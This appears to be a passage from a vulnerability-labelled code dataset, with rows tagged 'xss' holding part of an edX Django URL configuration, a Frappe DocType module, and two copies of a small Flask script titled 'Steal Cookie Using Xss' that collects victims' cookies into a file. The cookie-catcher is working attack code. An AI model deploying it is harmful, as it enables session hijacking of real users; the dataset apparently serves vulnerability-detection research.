        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1,xss
2,114,33993d2dca4259e574211b8fa84032894b278bb0,"xss.py/n/nfrom flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",0,xss
3,115,33993d2dca4259e574211b8fa84032894b278bb0,"/xss.py/n/nfrom flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n\n')
print(colored('\n\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == ""GET"" or request.method == ""POST"":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()
/n/n/n",1,xss
4,72,acd2f589b6cd2d1011be4a4e4965a1b3ed489c37,"frappe/core/doctype/doctype/doctype.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import six

import re, copy, os, subprocess
import frappe
from frappe import _

from frappe.utils import now, cint
from frappe.model import no_value_fields, default_fields
from frappe.model.document import Document
from frappe.custom.doctype.property_setter.property_setter import make_property_setter
from frappe.desk.notifications import delete_notification_count_for
from frappe.modules import make_boilerplate, get_doc_path
from frappe.model.db_schema import validate_column_name, validate_column_length, type_map
from frappe.model.docfield import supports_translation
import frappe.website.render

# imports - third-party imports
import pymysql
from pymysql.constants import ER

class InvalidFieldNameError(frappe.ValidationError): pass
class UniqueFieldnameError(frappe.ValidationError): pass
class IllegalMandatoryError(frappe.ValidationError): pass
class DoctypeLinkError(frappe.ValidationError): pass
class WrongOptionsDoctypeLinkError(frappe.ValidationError): pass
class HiddenAndMandatoryWithoutDefaultError(frappe.ValidationError): pass
class NonUniqueError(frappe.ValidationError): pass
class CannotIndexedError(frappe.ValidationError): pass
class CannotCreateStandardDoctypeError(frappe.ValidationError): pass

form_grid_templates = {
	""fields"": ""templates/form_grid/fields.html""
}

class DocType(Document):
	def get_feed(self):
		return self.name

	def validate(self):
		""""""Validate DocType before saving.

		- Check if developer mode is set.
		- Validate series
		- Check fieldnames (duplication etc)
		- Clear permission table for child tables
		- Add `amended_from` and `amended_by` if Amendable""""""

		self.check_developer_mode()

		self.validate_name()

		if self.issingle:
			self.allow_import = 0
			self.is_submittable = 0
			self.istable = 0

		elif self.istable:
			self.allow_import = 0
			self.permissions = []

		self.scrub_field_names()
		self.set_default_in_list_view()
		self.set_default_translatable()
		self.validate_series()
		self.validate_document_type()
		validate_fields(self)

		if self.istable:
			# no permission records for child table
			self.permissions = []
		else:
			validate_permissions(self)

		self.make_amendable()
		self.validate_website()

		if not self.is_new():
			self.before_update = frappe.get_doc('DocType', self.name)

		if not self.is_new():
			self.setup_fields_to_fetch()

		if self.default_print_format and not self.custom:
			frappe.throw(_('Standard DocType cannot have default print format, use Customize Form'))

	def set_default_in_list_view(self):
		'''Set default in-list-view for first 4 mandatory fields'''
		if not [d.fieldname for d in self.fields if d.in_list_view]:
			cnt = 0
			for d in self.fields:
				if d.reqd and not d.hidden and not d.fieldtype == ""Table"":
					d.in_list_view = 1
					cnt += 1
					if cnt == 4: break

	def set_default_translatable(self):
		'''Ensure that non-translatable never will be translatable'''
		for d in self.fields:
			if d.translatable and not supports_translation(d.fieldtype):
				d.translatable = 0

	def check_developer_mode(self):
		""""""Throw exception if not developer mode or via patch""""""
		if frappe.flags.in_patch or frappe.flags.in_test:
			return

		if not frappe.conf.get(""developer_mode"") and not self.custom:
			frappe.throw(_(""Not in Developer Mode! Set in site_config.json or make 'Custom' DocType.""), CannotCreateStandardDoctypeError)

	def setup_fields_to_fetch(self):
		'''Setup query to update values for newly set fetch values'''
		try:
			old_meta = frappe.get_meta(frappe.get_doc('DocType', self.name), cached=False)
			old_fields_to_fetch = [df.fieldname for df in old_meta.get_fields_to_fetch()]
		except frappe.DoesNotExistError:
			old_fields_to_fetch = []

		new_meta = frappe.get_meta(self, cached=False)

		self.flags.update_fields_to_fetch_queries = []

		if set(old_fields_to_fetch) != set([df.fieldname for df in new_meta.get_fields_to_fetch()]):
			for df in new_meta.get_fields_to_fetch():
				if df.fieldname not in old_fields_to_fetch:
					link_fieldname, source_fieldname = df.fetch_from.split('.', 1)
					link_df = new_meta.get_field(link_fieldname)

					self.flags.update_fields_to_fetch_queries.append('''update
							`tab{link_doctype}` source,
							`tab{doctype}` target
						set
							target.`{fieldname}` = source.`{source_fieldname}`
						where
							target.`{link_fieldname}` = source.name
							and ifnull(target.`{fieldname}`, '')="""" '''.format(
								link_doctype = link_df.options,
								source_fieldname = source_fieldname,
								doctype = self.name,
								fieldname = df.fieldname,
								link_fieldname = link_fieldname
					))

	def update_fields_to_fetch(self):
		'''Update fetch values based on queries setup'''
		if self.flags.update_fields_to_fetch_queries and not self.issingle:
			for query in self.flags.update_fields_to_fetch_queries:
				frappe.db.sql(query)

	def validate_document_type(self):
		if self.document_type==""Transaction"":
			self.document_type = ""Document""
		if self.document_type==""Master"":
			self.document_type = ""Setup""

	def validate_website(self):
		""""""Ensure that website generator has field 'route'""""""
		if self.has_web_view:
			# route field must be present
			if not 'route' in [d.fieldname for d in self.fields]:
				frappe.throw(_('Field ""route"" is mandatory for Web Views'), title='Missing Field')

			# clear website cache
			frappe.website.render.clear_cache()

	def change_modified_of_parent(self):
		""""""Change the timestamp of parent DocType if the current one is a child to clear caches.""""""
		if frappe.flags.in_import:
			return
		parent_list = frappe.db.sql(""""""SELECT parent
			from tabDocField where fieldtype=""Table"" and options=%s"""""", self.name)
		for p in parent_list:
			frappe.db.sql('UPDATE tabDocType SET modified=%s WHERE `name`=%s', (now(), p[0]))

	def scrub_field_names(self):
		""""""Sluggify fieldnames if not set from Label.""""""
		restricted = ('name','parent','creation','modified','modified_by',
			'parentfield','parenttype','file_list', 'flags', 'docstatus')
		for d in self.get(""fields""):
			if d.fieldtype:
				if (not getattr(d, ""fieldname"", None)):
					if d.label:
						d.fieldname = d.label.strip().lower().replace(' ','_')
						if d.fieldname in restricted:
							d.fieldname = d.fieldname + '1'
						if d.fieldtype=='Section Break':
							d.fieldname = d.fieldname + '_section'
						elif d.fieldtype=='Column Break':
							d.fieldname = d.fieldname + '_column'
					else:
						d.fieldname = d.fieldtype.lower().replace("" "",""_"") + ""_"" + str(d.idx)

				d.fieldname = re.sub('''['"",./%@()<>{}]''', '', d.fieldname)

				# fieldnames should be lowercase
				d.fieldname = d.fieldname.lower()

			# unique is automatically an index
			if d.unique: d.search_index = 0

	def validate_series(self, autoname=None, name=None):
		""""""Validate if `autoname` property is correctly set.""""""
		if not autoname: autoname = self.autoname
		if not name: name = self.name

		if not autoname and self.get(""fields"", {""fieldname"":""naming_series""}):
			self.autoname = ""naming_series:""

		# validate field name if autoname field:fieldname is used
		# Create unique index on autoname field automatically.
		if autoname and autoname.startswith('field:'):
			field = autoname.split("":"")[1]
			if not field or field not in [ df.fieldname for df in self.fields ]:
				frappe.throw(_(""Invalid fieldname '{0}' in autoname"".format(field)))
			else:
				for df in self.fields:
					if df.fieldname == field:
						df.unique = 1
						break

		if autoname and (not autoname.startswith('field:')) \
			and (not autoname.startswith('eval:')) \
			and (not autoname.lower() in ('prompt', 'hash')) \
			and (not autoname.startswith('naming_series:')):

			prefix = autoname.split('.')[0]
			used_in = frappe.db.sql('select name from tabDocType where substring_index(autoname, ""."", 1) = %s and name!=%s', (prefix, name))
			if used_in:
				frappe.throw(_(""Series {0} already used in {1}"").format(prefix, used_in[0][0]))

	def on_update(self):
		""""""Update database schema, make controller templates if `custom` is not set and clear cache.""""""
		from frappe.model.db_schema import updatedb
		self.delete_duplicate_custom_fields()
		try:
			updatedb(self.name, self)
		except Exception as e:
			print(""\n\nThere was an issue while migrating the DocType: {}\n"".format(self.name))
			raise e

		self.change_modified_of_parent()
		make_module_and_roles(self)

		self.update_fields_to_fetch()

		from frappe import conf
		if not self.custom and not (frappe.flags.in_import or frappe.flags.in_test) and conf.get('developer_mode'):
			self.export_doc()
			self.make_controller_template()

			if self.has_web_view:
				self.set_base_class_for_controller()

		# update index
		if not self.custom:
			self.run_module_method(""on_doctype_update"")
			if self.flags.in_insert:
				self.run_module_method(""after_doctype_insert"")

		delete_notification_count_for(doctype=self.name)
		frappe.clear_cache(doctype=self.name)

		if not frappe.flags.in_install and hasattr(self, 'before_update'):
			self.sync_global_search()

		# clear from local cache
		if self.name in frappe.local.meta_cache:
			del frappe.local.meta_cache[self.name]

		clear_linked_doctype_cache()

	def delete_duplicate_custom_fields(self):
		if not (frappe.db.table_exists(self.name) and frappe.db.table_exists(""Custom Field"")):
			return
		fields = [d.fieldname for d in self.fields if d.fieldtype in type_map]
		frappe.db.sql('''delete from
				`tabCustom Field`
			where
				 dt = {0} and fieldname in ({1})
		'''.format('%s', ', '.join(['%s'] * len(fields))), tuple([self.name] + fields), as_dict=True)

	def sync_global_search(self):
		'''If global search settings are changed, rebuild search properties for this table'''
		global_search_fields_before_update = [d.fieldname for d in
			self.before_update.fields if d.in_global_search]
		if self.before_update.show_name_in_global_search:
			global_search_fields_before_update.append('name')

		global_search_fields_after_update = [d.fieldname for d in
			self.fields if d.in_global_search]
		if self.show_name_in_global_search:
			global_search_fields_after_update.append('name')

		if set(global_search_fields_before_update) != set(global_search_fields_after_update):
			now = (not frappe.request) or frappe.flags.in_test or frappe.flags.in_install
			frappe.enqueue('frappe.utils.global_search.rebuild_for_doctype',
				now=now, doctype=self.name)

	def set_base_class_for_controller(self):
		'''Updates the controller class to subclass from `WebsiteGenertor`,
		if it is a subclass of `Document`'''
		controller_path = frappe.get_module_path(frappe.scrub(self.module),
			'doctype', frappe.scrub(self.name), frappe.scrub(self.name) + '.py')

		with open(controller_path, 'r') as f:
			code = f.read()

		class_string = '\nclass {0}(Document)'.format(self.name.replace(' ', ''))
		if '\nfrom frappe.model.document import Document' in code and class_string in code:
			code = code.replace('from frappe.model.document import Document',
				'from frappe.website.website_generator import WebsiteGenerator')
			code = code.replace('class {0}(Document)'.format(self.name.replace(' ', '')),
				'class {0}(WebsiteGenerator)'.format(self.name.replace(' ', '')))

		with open(controller_path, 'w') as f:
			f.write(code)


	def run_module_method(self, method):
		from frappe.modules import load_doctype_module
		module = load_doctype_module(self.name, self.module)
		if hasattr(module, method):
			getattr(module, method)()

	def before_rename(self, old, new, merge=False):
		""""""Throw exception if merge. DocTypes cannot be merged.""""""
		if not self.custom and frappe.session.user != ""Administrator"":
			frappe.throw(_(""DocType can only be renamed by Administrator""))

		self.check_developer_mode()
		self.validate_name(new)

		if merge:
			frappe.throw(_(""DocType can not be merged""))

		# Do not rename and move files and folders for custom doctype
		if not self.custom and not frappe.flags.in_test and not frappe.flags.in_patch:
			self.rename_files_and_folders(old, new)

	def after_rename(self, old, new, merge=False):
		""""""Change table name using `RENAME TABLE` if table exists. Or update
		`doctype` property for Single type.""""""
		if self.issingle:
			frappe.db.sql(""""""update tabSingles set doctype=%s where doctype=%s"""""", (new, old))
			frappe.db.sql(""""""update tabSingles set value=%s
				where doctype=%s and field='name' and value = %s"""""", (new, new, old))
		else:
			frappe.db.sql(""rename table `tab%s` to `tab%s`"" % (old, new))

	def rename_files_and_folders(self, old, new):
		# move files
		new_path = get_doc_path(self.module, 'doctype', new)
		subprocess.check_output(['mv', get_doc_path(self.module, 'doctype', old), new_path])

		# rename files
		for fname in os.listdir(new_path):
			if frappe.scrub(old) in fname:
				subprocess.check_output(['mv', os.path.join(new_path, fname),
					os.path.join(new_path, fname.replace(frappe.scrub(old), frappe.scrub(new)))])

		self.rename_inside_controller(new, old, new_path)
		frappe.msgprint('Renamed files and replaced code in controllers, please check!')

	def rename_inside_controller(self, new, old, new_path):
		for fname in ('{}.js', '{}.py', '{}_list.js', '{}_calendar.js', 'test_{}.py', 'test_{}.js'):
			fname = os.path.join(new_path, fname.format(frappe.scrub(new)))
			if os.path.exists(fname):
				with open(fname, 'r') as f:
					code = f.read()
				with open(fname, 'w') as f:
					f.write(code.replace(frappe.scrub(old).replace(' ', ''), frappe.scrub(new).replace(' ', '')))

	def before_reload(self):
		""""""Preserve naming series changes in Property Setter.""""""
		if not (self.issingle and self.istable):
			self.preserve_naming_series_options_in_property_setter()

	def preserve_naming_series_options_in_property_setter(self):
		""""""Preserve naming_series as property setter if it does not exist""""""
		naming_series = self.get(""fields"", {""fieldname"": ""naming_series""})

		if not naming_series:
			return

		# check if atleast 1 record exists
		if not (frappe.db.table_exists(self.name) and frappe.db.sql(""select name from `tab{}` limit 1"".format(self.name))):
			return

		existing_property_setter = frappe.db.get_value(""Property Setter"", {""doc_type"": self.name,
			""property"": ""options"", ""field_name"": ""naming_series""})

		if not existing_property_setter:
			make_property_setter(self.name, ""naming_series"", ""options"", naming_series[0].options, ""Text"", validate_fields_for_doctype=False)
			if naming_series[0].default:
				make_property_setter(self.name, ""naming_series"", ""default"", naming_series[0].default, ""Text"", validate_fields_for_doctype=False)

	def export_doc(self):
		""""""Export to standard folder `[module]/doctype/[name]/[name].json`.""""""
		from frappe.modules.export_file import export_to_files
		export_to_files(record_list=[['DocType', self.name]], create_init=True)

	def import_doc(self):
		""""""Import from standard folder `[module]/doctype/[name]/[name].json`.""""""
		from frappe.modules.import_module import import_from_files
		import_from_files(record_list=[[self.module, 'doctype', self.name]])

	def make_controller_template(self):
		""""""Make boilerplate controller template.""""""
		make_boilerplate(""controller._py"", self)

		if not self.istable:
			make_boilerplate(""test_controller._py"", self.as_dict())
			make_boilerplate(""controller.js"", self.as_dict())
			#make_boilerplate(""controller_list.js"", self.as_dict())
			if not os.path.exists(frappe.get_module_path(frappe.scrub(self.module),
				'doctype', frappe.scrub(self.name), 'tests')):
				make_boilerplate(""test_controller.js"", self.as_dict())

		if self.has_web_view:
			templates_path = frappe.get_module_path(frappe.scrub(self.module), 'doctype', frappe.scrub(self.name), 'templates')
			if not os.path.exists(templates_path):
				os.makedirs(templates_path)
			make_boilerplate('templates/controller.html', self.as_dict())
			make_boilerplate('templates/controller_row.html', self.as_dict())

	def make_amendable(self):
		""""""If is_submittable is set, add amended_from docfields.""""""
		if self.is_submittable:
			if not frappe.db.sql(""""""select name from tabDocField
				where fieldname = 'amended_from' and parent = %s"""""", self.name):
					self.append(""fields"", {
						""label"": ""Amended From"",
						""fieldtype"": ""Link"",
						""fieldname"": ""amended_from"",
						""options"": self.name,
						""read_only"": 1,
						""print_hide"": 1,
						""no_copy"": 1
					})

	def get_max_idx(self):
		""""""Returns the highest `idx`""""""
		max_idx = frappe.db.sql(""""""select max(idx) from `tabDocField` where parent = %s"""""",
			self.name)
		return max_idx and max_idx[0][0] or 0

	def validate_name(self, name=None):
		if not name:
			name = self.name

		# a DocType's name should not start with a number or underscore
		# and should only contain letters, numbers and underscore
		if six.PY2:
			is_a_valid_name = re.match(""^(?![\W])[^\d_\s][\w ]+$"", name)
		else:
			is_a_valid_name = re.match(""^(?![\W])[^\d_\s][\w ]+$"", name, flags = re.ASCII)
		if not is_a_valid_name:
			frappe.throw(_(""DocType's name should start with a letter and it can only consist of letters, numbers, spaces and underscores""), frappe.NameError)

def validate_fields_for_doctype(doctype):
	doc = frappe.get_doc(""DocType"", doctype)
	doc.delete_duplicate_custom_fields()
	validate_fields(frappe.get_meta(doctype, cached=False))

# this is separate because it is also called via custom field
def validate_fields(meta):
	""""""Validate doctype fields. Checks
	1. There are no illegal characters in fieldnames
	2. If fieldnames are unique.
	3. Validate column length.
	4. Fields that do have database columns are not mandatory.
	5. `Link` and `Table` options are valid.
	6. **Hidden** and **Mandatory** are not set simultaneously.
	7. `Check` type field has default as 0 or 1.
	8. `Dynamic Links` are correctly defined.
